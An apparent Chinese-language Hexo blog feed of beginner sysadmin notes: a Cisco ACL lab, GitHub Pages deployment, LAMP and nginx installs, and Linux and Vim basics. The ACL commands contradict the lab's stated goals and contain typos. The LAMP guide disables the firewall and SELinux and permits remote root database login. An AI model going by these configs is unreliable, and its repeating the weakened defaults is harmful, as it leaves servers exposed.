src="https://s2.loli.net/2021/12/25/Et7dKfJLkPQFSoe.png" alt="image-20211225222302455"></p><p><img src="https://s2.loli.net/2021/12/25/5RMpUfyBFNe2vIr.png" alt="image-20211225221810570"></p><p>​    <img src="../../../img/image-20211225221342526.png" alt="image-20211225221342526"></p><p><img src="https://s2.loli.net/2021/12/25/H6O9ocKgtdzyxap.png" alt="image-20211225221400956"></p><p><img src="https://s2.loli.net/2021/12/25/OY6uwMcU5hxr2KW.png" alt="image-20211225221412994"></p><p><img src="https://s2.loli.net/2021/12/25/nmN4Mj6uyKblPf2.png" alt="image-20211225221424717"></p><p><img src="../../../img/image-20211225221454303.png" alt="image-20211225221454303"></p><p><img src="../../../img/image-20211225221504021.png" alt="image-20211225221504021"></p><p><img src="../../../img/image-20211225221525800.png" alt="image-20211225221525800"></p><p><img src="../../../img/image-20211225221552813.png" alt="image-20211225221552813"></p><p>服务器浏览器版本太低，需要在外面浏览器测试</p><p>在网站根目录下</p><p><img src="https://s2.loli.net/2021/12/25/OIGXJ2z8bg1yV6D.png" alt="image-20211225222127139"></p><p><img src="../../../img/image-20211225221629946.png" alt="image-20211225221629946"></p><p>end</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.在&lt;a href=&quot;https://down.chinaz.com/soft/29129.htm%E4%B8%8B%E8%BD%BD%E6%A0%A1%E6%97%A0%E5%BF%A7%E6%95%99%E5%B8%88%E8%AF%84%E4%BB%B7%E7%B3</summary>
      
    
    
    
    
    <category term="windows" scheme="http://aisibuhuipao.github.io/tags/windows/"/>
    
    <category term="数据库" scheme="http://aisibuhuipao.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>路由</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/%E8%B7%AF%E7%94%B1/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/%E8%B7%AF%E7%94%B1/</id>
    <published>2021-12-25T13:51:40.000Z</published>
    <updated>2021-12-25T13:51:40.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/IMG_0939.JPG" alt="IMG_0939"></p><p>实验要求：要求以下全部使用标准ACL实现</p><p>​     1.要求10网段禁止访问整个50网段，访问其他不受限制</p><p>​     2.要求10.1.1.1禁止访问40网段，其他不受影响</p><p>​     3.要求40.1.1.1禁止访问50网段，其他不受影响</p><p>拓补图</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/clip_image002.jpg" alt="img"></p><p>配置</p><p>PC0：ip 192.168.10.10/24 192.168.10.1</p><p>PC1：ip 192.168.10.20/24 192.168.10.1</p><p>PC2：ip 192.168.50.10/24 192.168.50.1</p><p>PC3：ip 192.168.50.20/24 192.168.50.1</p><p>PC4：ip 192.168.40.20/24 192.168.40.1</p><p>PC5：ip 192.168.40.10/24 192.168.40.1</p><p>R1:</p><p>R1&gt;：enable</p><p>​    configure terminal</p><p>​    hostname R1</p><p>​    intface g0/0</p><p>​    ip address 192.168.10.1 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    intface g0/1</p><p>​    ip address 192.168.20.10 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    ip route 0.0.0.0 0.0.0.0 192.168.20.20</p><p>​    exit</p><p>R3:</p><p>​    R3&gt;：enable</p><p>​    configure terminal</p><p>​    hostname R3</p><p>​    intface g0/1</p><p>​    ip address 192.168.40.1 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    intface g0/0</p><p>​    ip address 192.168.30.20 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    ip route 0.0.0.0 0.0.0.0 192.168.30.10</p><p>​    exit</p><p>R2：</p><p>​    R2&gt;：enable</p><p>​    configure terminal</p><p>​    hostname R2</p><p>​    intface g0/0</p><p>​    ip address 192.168.20.20 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    intface g0/1</p><p>​    ip address 192.168.30.10 255.255.255.0</p><p>​    no shutdown</p><p>​    intface g0/2</p><p>​    ip address 192.168.50.1 255.255.255.0</p><p>​    no shutdown</p><p>exit</p><p>​    ip route 192.168.10.0 255.255.255.0 192.168.20.10</p><p>​    ip route 192.168.40.0 255.255.255.0 192.168.30.20</p><p>​    exit</p><p>全通之后建立ACL表禁止</p><p>​    R1：configure terminal</p><p>​       access-list 10 deny 192.168.0.0 0.0.255.255</p><p>​       intface g0/0</p><p>​       ip access-group 10 in</p><p>​    R3：configure terminal</p><p>​       access-list 10 deny 192.168.0.0 0.0.255.255</p><p>​       interface g0/1</p><p>​       ip access-group 10 in</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/clip_image004.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/clip_image006.jpg" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/aisibuhuipao/img/main/IMG_0939.JPG&quot; alt=&quot;IMG_0939&quot;&gt;&lt;/p&gt;
&lt;p&gt;实验要求：要求以下全部使用标准ACL实现&lt;/p&gt;
&lt;p&gt;​     </summary>
      
    
    
    
    
    <category term="路由" scheme="http://aisibuhuipao.github.io/tags/%E8%B7%AF%E7%94%B1/"/>
    
  </entry>
  
  <entry>
    <title>hexo搭建部署到github</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/hexo%E6%90%AD%E5%BB%BA/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/hexo%E6%90%AD%E5%BB%BA/</id>
    <published>2021-12-25T08:53:27.000Z</published>
    <updated>2021-12-25T08:53:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>软件安装</p><p><a href="https://nodejs.org/en/">node.js</a> 安装后 node -v </p><p><a href="https://git-scm.com/download/win">git</a> 安装后 git -v</p><p>打开git 命令行窗口输入,完成后 cnpm -v</p><p><code>npm install -g cnpm --registry==https://registry.npm.taobao.org</code></p><p>安装hexo</p><p><code>cnpm install -g hexo-cli</code>    完成后 hexo -v</p><p>搭建 hexo 博客</p><p>1.在电脑里随便哪个盘符新建文件夹myblog(名字随便)</p><p>2.进入刚刚新建的文件夹，右键打开 git bash here</p><p>​        <code>hexo init</code>        初始化后会自动下载一些文件到这个目录</p><p>3.<code>hexo g</code>生成和<code>hexo s</code>启动服务</p><p>4.hexo s 是开启本地预览服务，打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a> 就可以可看到内容</p><p>5.<a href="https://hexo.io/themes/">在这里</a>选择一个喜欢的主题下载到本地</p><p>6.将主题解压只博客根目录下的 themes 文件夹下</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225171007003.png" alt="image-20211225171007003"></p><p>7.打开博客根目录下的 _config.yml 文件，在里面找到 theme: (冒号后面改成主题的文件夹名字)</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225171519410.png" alt="image-20211225171519410"></p><p><img src="https://s2.loli.net/2021/12/25/KZUlnzDOadV4ih5.png" alt="image-20211225212255378"></p><p>​            theme:后面填下载主题的文件夹名字</p><p>​            repo:后面输入仓库地址，不清楚的话，仓库地址在下图</p><p>​            <img src="https://s2.loli.net/2021/12/25/5IaEk27ciNM6qbw.png" alt="image-20211225212519454"></p><p>​            branch:后面输入仓库分支，master</p><p>8.执行 <code>hexo clean &amp;&amp; hexo g</code>    清理缓存，然后<code>hexo s</code> 查看效果</p><p>9.修改主题内容可以参考主题作者的github文档</p><p>部署到github</p><p>1.在github上新建一个仓库，每个ID只能建一个仓库来用作域名</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225171847503.png" alt="image-20211225171847503"></p><p><img src="https://s2.loli.net/2021/12/25/yuUHFWnvbdIPzSh.png" alt="image-20211225210322079"></p><p>配置SSH免密登录</p><p>提交代码的时候需要你github的权限，每次打密码不方便也不安全，所以使用SSH来解决这个问题</p><p>​    1.找到C:\Users\as\ssh,这个文件夹并删除</p><p>​    2.然后右键打开git bash here 输入命令：<code>ssh-keygen -t rsa -C github xxxxxxx@000.com(注册github的邮件地址)</code>，生成密钥，连续敲三次回车，出现下图，代表成功。</p><p><img src="https://s2.loli.net/2021/12/25/2z7xgERQ6yTAsjD.png" alt="image-20211225213650448"></p><p>​    3.最后生成一个新的ssh文件夹，找到 ssh\id_rsa.pub 文件，打开后复制里面的密钥内容。</p><p>​    4.打开github主页</p><p>​    <img src="https://s2.loli.net/2021/12/25/1FHlSgVfzOdaMUm.png" alt="image-20211225211318194"></p><p><img src="https://s2.loli.net/2021/12/25/ZyusHmliaMzqDtr.png" alt="image-20211225211339158"></p><p><img src="https://s2.loli.net/2021/12/25/PdpKTjAY4MQFJV9.png" alt="image-20211225211356823"></p><p>​    <img src="https://s2.loli.net/2021/12/25/YeFz6GLKxfqryXl.png" alt="image-20211225211421951"></p><p>​    粘贴内容，点击绿色的图标</p><p>​    5.测试是否成功</p><p>​    输入<code>ssh -T git@github.com </code></p><p>​    如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：</p><p>​    Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access </p><p>​    看到这个信息，说明已经成功了。</p><p>​    6.配置仓库</p><p>​    <code>git config --global user.name "username" </code>        双引号里面的内容添自己的github的用户名</p><p>​    <code>git config --global user.email  "xxx@qq.com" </code>        双引号里面的内容添自己注册github的邮箱</p><p>​    7.最后在博客的根目录下，打开DOS窗口或者右键打开 github bash here 输入命令</p><p>​    <code>hexo clean &amp;&amp; hexo g</code></p><p>​    推到自己的仓库</p><p>​    <code>hexo d</code></p><p>​    浏览器中输入自己的github地址，查看自己的博客吧。</p><p>​    其他命令：</p><p>​    <code>hexo new "xxx"</code>        新建博客文档</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;软件安装&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nodejs.org/en/&quot;&gt;node.js&lt;/a&gt; 安装后 node -v &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://git-scm.com/download/win&quot;&gt;git&lt;/a&gt; 安装后 git -</summary>
      
    
    
    
    
    <category term="hexo" scheme="http://aisibuhuipao.github.io/tags/hexo/"/>
    
    <category term="github" scheme="http://aisibuhuipao.github.io/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>LAMP搭建</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/LAMP%E6%90%AD%E5%BB%BA/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/LAMP%E6%90%AD%E5%BB%BA/</id>
    <published>2021-12-25T08:08:50.000Z</published>
    <updated>2021-12-25T08:08:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>yum安装apache+php+mysql，配置开机自启</p><p><code>yum install -y httpd mariadb-server php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml</code></p><p>配置防火墙开机不启动</p><p><code>systemctl disable firewalld</code></p><p>停止防火墙</p><p><code>systemctl stop firewalld</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160955245.png" alt="image-20211225160955245"></p><p>设置数据库开机启动</p><p><code>systemctl enable mariadb</code></p><p><code>systemctl start mariadb</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225161605939.png" alt="image-20211225161605939"></p><p>编辑文件 使 apache 网页显示php基本信息</p><p><code>vim /var/www/heml/index.php</code></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line">phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>打开网页看看<img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162322514.png" alt="image-20211225162322514"></p><p>编辑配置文件关闭SElinux安全模块</p><p><code>vim /etc/sysconfig/selinux</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162010980.png" alt="image-20211225162010980"></p><p>配置mysql </p><p><code>mysql_secure_installation</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162104003.png" alt="image-20211225162104003"></p><p>是否设置root 密码        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162356614.png" alt="image-20211225162356614"></p><p>是否删除匿名用户        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162424048.png" alt="image-20211225162424048"></p><p>是否允许root远程登录        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162456282.png" alt="image-20211225162456282"></p><p>是否删除测试数据库        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162513236.png" alt="image-20211225162513236"></p><p>是否刷新权限        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162530272.png" alt="image-20211225162530272"></p><p>登录mysql</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162547106.png" alt="image-20211225162547106"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;yum安装apache+php+mysql，配置开机自启&lt;/p&gt;
&lt;p&gt;&lt;code&gt;yum install -y httpd mariadb-server php php-mysql php-common php-gd php-mbstring php-mcrypt php</summary>
      
    
    
    
    
    <category term="mysql" scheme="http://aisibuhuipao.github.io/tags/mysql/"/>
    
    <category term="LAMP" scheme="http://aisibuhuipao.github.io/tags/LAMP/"/>
    
    <category term="apache" scheme="http://aisibuhuipao.github.io/tags/apache/"/>
    
    <category term="php" scheme="http://aisibuhuipao.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>源码安装nginx</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85nginx/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85nginx/</id>
    <published>2021-12-25T07:52:53.000Z</published>
    <updated>2021-12-25T07:52:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>源码安装nginx，下载html源代码，把源代码运行起来。</p><p>在<a href="http://nginx.org/download/nginx-1.20.2.tar.gz%E4%B8%8B%E8%BD%BD%E6%9C%AC%E5%9C%B0">http://nginx.org/download/nginx-1.20.2.tar.gz下载本地</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155336921.png" alt="image-20211225155336921"></p><p>在文件存放目录右键打开终端</p><p><code>scp .\nginx-1.28.2.tar.gz root@192.168.3.128:/root</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155357240.png" alt="image-20211225155357240"></p><p>解压</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155424411.png" alt="image-20211225155424411"></p><p>./ 运行configure</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155458169.png" alt="image-20211225155458169"></p><p>错误提示：没有PCRE库</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155511400.png" alt="image-20211225155511400"></p><p>安装 gcc pcre pcre-devel 库</p><p><code>yum install -y gcc pcre pcre-devel zlib liberary</code></p><p>配置目录</p><p>/uer/bin/ = 软件二进制文件</p><p>/etc/xxx.conf = 软件的配置文件</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160429417.png" alt="image-20211225160429417"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155833639.png" alt="image-20211225155833639"></p><p>将nginx 启动文件安装到/usr/bin/nginx 下</p><p>将nginx 配置文件安装到/etc/nginx/ 下</p><p><code>./configure --sbin-path=/usr/bin/nginx --conf-path=/etc/nginx/nginx.conf</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160457547.png" alt="image-20211225160457547"></p><p>编译安装</p><p>安装过程中至结束没有显示错误表示安装成功</p><p><code>make &amp;&amp; make install</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160619191.png" alt="image-20211225160619191"></p><p>启动</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160647403.png" alt="image-20211225160647403"></p><p>关闭防火墙测试</p><p>systemctl stop firewalld</p><p>测试是否成功开启服务</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160730366.png" alt="image-20211225160730366"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;源码安装nginx，下载html源代码，把源代码运行起来。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;http://nginx.org/download/nginx-1.20.2.tar.gz%E4%B8%8B%E8%BD%BD%E6%9C%AC%E5%9C%B0&quot;&gt;http://</summary>
      
    
    
    
    
    <category term="nginx" scheme="http://aisibuhuipao.github.io/tags/nginx/"/>
    
    <category term="LNMP" scheme="http://aisibuhuipao.github.io/tags/LNMP/"/>
    
  </entry>
  
  <entry>
    <title>Vim基础</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/Vim%E5%9F%BA%E7%A1%80/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/Vim%E5%9F%BA%E7%A1%80/</id>
    <published>2021-12-25T07:44:36.000Z</published>
    <updated>2021-12-25T07:44:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>Vim基础命令</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154521878.png" alt="image-20211225154521878"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154532563.png" alt="image-20211225154532563"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154547117.png" alt="image-20211225154547117"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154618354.png" alt="image-20211225154618354"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154627549.png" alt="image-20211225154627549"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154634592.png" alt="image-20211225154634592"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154715657.png" alt="image-20211225154715657"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154727390.png" alt="image-20211225154727390"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Vim基础命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154521878.png&quot; alt=&quot;image-2021122515452187</summary>
      
    
    
    
    
    <category term="命令" scheme="http://aisibuhuipao.github.io/tags/%E5%91%BD%E4%BB%A4/"/>
    
    <category term="Vim" scheme="http://aisibuhuipao.github.io/tags/Vim/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础命令</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</id>
    <published>2021-12-25T07:34:45.000Z</published>
    <updated>2021-12-25T07:34:45.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/IMG_1773.JPG" alt="IMG_1773"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153600700.png" alt="image-20211225153600700"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153721923.png" alt="image-20211225153721923"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153721923.png"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153805828.png" alt="image-20211225153805828"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153816344.png" alt="image-20211225153816344"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153816344.png"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153845073.png" alt="image-20211225153845073"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153857001.png" alt="image-20211225153857001"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153906435.png" alt="image-20211225153906435"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153956501.png" alt="image-20211225153956501"><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154032287.png" alt="image-20211225154032287"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154235670.png" alt="image-20211225154235670"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154253661.png" alt="image-20211225154253661"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154302395.png" alt="image-20211225154302395"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154311528.png" alt="image-20211225154311528"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154321188.png" alt="image-20211225154321188"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154333980.png" alt="image-20211225154333980"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154345404.png" alt="image-20211225154345404"></p><p> 网络类</p><p>​    查看网卡信息</p><p>​    <code>ip addr</code></p><p>​    查看路由信息&amp;默认网关</p><p>​    <code>ip route</code></p><p>​    查看网卡信息（老系统）</p><p>​    <code>ifconfig</code></p><p>​    查看本机开发的TCP和UDP端口</p><p>​    <code>netstat -antlp</code></p><p>​    <code>netstat -anulp</code></p><p>​    （-a:显示所有， -n:不解析服务名称， t:仅显示tcp信息， -u:仅显示udp信息）</p><p>​    查看正在监听的端口</p><p>​    <code>ss -antlp</code>和netstat类似，但是比netstat更快</p><p>​    查看路由跳点（可以看到路由都经过哪些地址最终到达目标地址）</p><p>​    TRACERT （windows：必须大写）</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225163324758.png" alt="image-20211225163324758"></p><p>​    查询域名ip地址信息 </p><p>​    <code>nslookup baidu.com</code></p><p>服务类</p><p>​    查看系统进程</p><p>​    <code>ps -aux</code> （通常和kill -9一起使用&amp;最常用法是：ps -ef | grep xxx:查询某个关键字）         a:显示所有程序         u:以用户为主的格式来显示         x:显示所有程序，不以终端机来区分 </p><p>ps看到的是命令执行瞬间的进程信息,而top可以持续的监视 </p><p>ps只是查看进程,而top还可以监视系统性能,如平均负载,cpu和内存的消耗</p><p><code>top</code></p><p>top还可以操作进程,如改变优先级(命令r)和关闭进程(命令k) top主要看cpu,内存使用情况，及占用资源最多的进程由高到低排序，关注点在 于资源占用情况，但是查看内存占用是不准确的</p><p>查看内存： </p><p><code>free -h</code>       自动转换单位(常用)</p><pre><code>     -b         Byte显示</code></pre><p>​        -k          KB显示</p><p>​        -m         MB显示</p><p>​        -g          GB显示</p><p>​        -o         不显示缓冲区 </p><p>​        -t         显示内存总和列</p><p>​        -s         间隔n秒，持续查看 内存总数 已使用总数 空闲内存 多个进程共享的内存</p><p>设置服务</p><p>​    systemctl </p><p>​        restart xxx //重启或这重新加载服务 </p><p>​        start //启动服务 </p><p>​        stop //停止服务，关机或重新启动会失效 </p><p>​        status //查看服务执行信息和有没有开机启动的信息 </p><p>​        enable //设置服务开机启动 </p><p>​        disable //设置服务开机不启动</p><p>结束进程</p><p>​     kill    </p><p>​         -1(HUP) 重载进程</p><p>​        -9(KILL) 杀死一个进程</p><p>​        -15(TERM) 正常停止进程</p><p>显示当前系统信息        </p><p>w</p><p>显示当前登录的用户</p><p>who</p><p>特殊操作 切换和隐藏程序执行窗口，只有主动停止或者关机重启，程序才会停止，有点类似windows的最 小化 在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始 流行的Linux发行版（例如Red Hat Enterprise Linux）通常会自带screen实用程序，如 果没有的话，可以从GNU screen的官方网站下载</p><p><code>yum install -y screen</code></p><p> <code>screen -ls</code>列出所有后台的会话</p><p><code>screen -S name1 vim</code> 给窗口命名</p><p><code>screen -r 窗口号</code>重新打开会话窗口</p><p>后台 control + a + d 切换窗口</p><p><code>screen -rd name1</code>将指定的窗口离线或恢复离线</p><p>后台挂起运行</p><p><code>nohup</code></p><p><code>nohup ping 8.8.8.8 &amp;</code>        //不加 &amp; 的话，关闭窗口会中断执行</p><p>fg 显示后台挂起的程序</p><p>显示目录文件大小</p><p>du 文件名</p><p>显示当前目录下的文件所占用的空间</p><p>du -sh</p><p>查看磁盘被占用的信息</p><p>df</p><p>防火墙(/etc/services)</p><p> <code>ystemctl start firewalld</code> 启动</p><p> <code>systemctl stop firewalld</code> 停止</p><p> <code>firewall-cmd --reload</code> 重新加载防火墙</p><p><code>firewall-camd --state</code> 查看运行状态</p><p><code>firewall-cmd --zone=public --list-ports </code> 显示当前允许通过的端口信息</p><p><code>firewall-cmd --zone=public --list-service</code> 显示当前允许通过的服务</p><p><code>firewall-cmd --zone=public --add-port=80/tcp --permanent</code> 允许哪个端口可以通过</p><p><code>firewall-cmd --zone=public --add-service=http --permanent</code> 允许哪个服务可以通过</p><p><code>firewall-cmd --zone=public --remove-port=http --permanent</code> 删除指定的端口</p><p>开启一个网页端的端口</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">8080</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/aisibuhuipao/img/main/IMG_1773.JPG&quot; alt=&quot;IMG_1773&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuserco</summary>
      
    
    
    
    
    <category term="Linux" scheme="http://aisibuhuipao.github.io/tags/Linux/"/>
    
    <category term="命令" scheme="http://aisibuhuipao.github.io/tags/%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>centos7配置网卡为静态IP</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/centos7%E9%85%8D%E7%BD%AE%E7%BD%91%E5%8D%A1%E4%B8%BA%E9%9D%99%E6%80%81IP/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/centos7%E9%85%8D%E7%BD%AE%E7%BD%91%E5%8D%A1%E4%B8%BA%E9%9D%99%E6%80%81IP/</id>
    <published>2021-12-25T07:30:38.000Z</published>
    <updated>2021-12-25T07:30:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>1． 打开虚拟机后，桌面右键打开Open Terminal</p><p>2． 使用命令 su 切换到root账户</p><p>3． 用vim编辑器打开网卡配置文件</p><p>4． Vim /etc/sysconfig/network-scripts/ifcfg-ens33</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153113536.png" alt="image-20211225153113536"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153131923.png" alt="image-20211225153131923"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153131923.png"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153208160.png" alt="image-20211225153208160"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153225002.png" alt="image-20211225153225002"></p><p>5.然后按ESC然后按Shiftt+: 冒号进入命令行模式输入 “wq”保存退出</p><p>6.使用命令重启网卡 systemctl restart network</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153250495.png" alt="image-20211225153250495"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1． 打开虚拟机后，桌面右键打开Open Terminal&lt;/p&gt;
&lt;p&gt;2． 使用命令 su 切换到root账户&lt;/p&gt;
&lt;p&gt;3． 用vim编辑器打开网卡配置文件&lt;/p&gt;
&lt;p&gt;4． Vim /etc/sysconfig/network-scripts/ifcfg-en</summary>
      
    
    
    
    
    <category term="centos7" scheme="http://aisibuhuipao.github.io/tags/centos7/"/>
    
    <category term="网卡配置" scheme="http://aisibuhuipao.github.io/tags/%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu安装</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/ubuntu/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/ubuntu/</id>
    <published>2021-12-25T07:16:20.000Z</published>
    <updated>2021-12-25T07:16:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在虚拟机安装ubuntu系统"><a href="#在虚拟机安装ubuntu系统" class="headerlink" title="在虚拟机安装ubuntu系统"></a>在虚拟机安装ubuntu系统</h1><p>\1.   先到 <a href="https://ubuntu.com/%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6">https://ubuntu.com/下载镜像文件</a></p><p>​         <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152032412.png" alt="image-20211225152032412"></p><p>​       <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152204645.png" alt="image-20211225152204645">        </p><p> \2.   下载完成后启动虚拟机</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152240480.png" alt="image-20211225152240480"></p><p>​        </p><pre><code>     ![image-20211225152255088](https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152255088.png)      ![image-20211225152320738](https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152320738.png)</code></pre><p>​        